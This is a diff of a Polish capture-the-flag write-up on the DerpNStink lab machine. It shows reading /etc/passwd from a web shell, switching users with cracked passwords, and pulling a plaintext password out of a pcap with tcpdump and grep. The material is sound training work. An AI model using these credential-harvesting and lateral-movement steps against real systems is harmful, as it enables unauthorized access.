@@ -562,13 +562,96 @@ unclestinky:wedgie57
 1 password hash cracked, 0 left
 ```
 
-Wykorzystajmy te dane aby zalogować się do wordpressa. Tam w zakładce **Posts** czeka na nas druga flaga:
+Wykorzystajmy te dane aby zalogować się do wordpressa. Szybkie rozeznanie i trafiamy do zakładki **Posts**. Tam już czeka na nas szkic postu `**Flag2.txt**` a w nim druga flaga:
 ![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/flag2.png)
 `flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)`
 
+## 4. Uruchomienie powłoki z nowego konta
 
-Trzecią flagę znajdziemy w katalogu Desktop użytkownika unclestinky
+W tle wciąż działa zespawnowany przez nas wcześniej shell - pora znowu go wykorzystać. 
+
+```
+www-data@DeRPnStiNK$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
+stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
+ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
+mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
+```
+
+Postarajmy się zalogować jako user `stinky`, wykorzystując hasło, które dostarczył nam **JohnTheRipper**
+
+```
+www-data@DeRPnStiNK:/$ cd /var/www/html
+cd /var/www/html
+www-data@DeRPnStiNK:/var/www/html$ su stinky
+su stinky
+Password: wedgie57
+
+stinky@DeRPnStiNK:/var/www/html$
+```
+Działa! Czas się porozglądać!
+Wejdźmy do katalogu `home` i poszukajmy plików, które mogą zawierać na przykład dalsze wskazówki.
+Trzecią flagę znajdziemy w katalogu `Desktop` w pliku `flag.txt`
 `flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)`
+![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/flag3.png)
+Idąc dalej, w katalogu `network-logs` odkrywamy zapis konwersacji pomiędzy użytkownikami:
+![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/conversation.png)
+Dowiadujemy się, że user `stinky` może coś wiedzieć na temat hasła usera `mrderp` \
+Szukamy teraz odpowiedniego pliku z rozszerzeniem `.pcap` \
+Namierzamy go w katalogu `Documents`
+Przyda nam się dostęp do sniffera `tcpdump` żeby zajrzeć do środka pliku \
+`tcpdump -nt -r derpissues.pcap -A | grep -P 'pwd='`
+![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/pcap-tcpdump.png)
+Przy użyciu `grep` błyskawicznie przejęliśmy hasło usera `mrderp` \
+`derpderpderpderpderpderpderp`
+
+Użyjmy dostępnych danych i zalogujmy się jako `mrderp`
+```
+stinky@DeRPnStiNK:~/Documents$ su mrderp                                                
+su mrderp                                                                               
+Password: derpderpderpderpderpderpderp                                                  
+                                                                                        
+mrderp@DeRPnStiNK:/home/stinky/Documents$ 
+```
+Jak widać logowanie przebiegło pomyślnie :-) \
+W katalogu `Desktop` usera `mrderp` czeka na nas podejrzany plik o nazwie `helpdesk.log`
+
+```
+From: Help Desk
+Date: Mon, Sep 10, 2017 at 2:53 PM
+Subject: sudoers ISSUE=242 PROJ=26
+To: Derp, Mr (mrderp) [C]
+When replying, type your text above this line.
+
+Closed Ticket Notification
+
+Thank you for contacting the Help Desk. Your ticket information and its resolution is
+below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
+assistance, please reply to this notification to provide additional information.
+If you need immediate help (i.e. you are within two days of a deadline or in the event of a
+security emergency), call us or visit our Self Help Web page at https://pastebin.com/RzK9WfGw 
+Note that the Help Desk's busiest hours are between 10 a.m. (ET)
+and 3 p.m. (ET).
+Toll-free: 1-866-504-9552
+Phone: 301-402-7469
+TTY: 301-451-5939
+Ticket Title: sudoers issues
+Ticket Number: 242
+Status: Closed
+Date Created: 09/10/2017
+Latest Update Date: 09/10/2017
+CC’s:
+Resolution: Closing ticket. ticket notification.
+```
+W tekście mamy podany link do strony Self Help Web. Upewnijmy się co kryje się za tym adresem :)
+
+![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/pastebin.png) 
+
+
+## 5. Eskalacja uprawnień
+
 
 
 
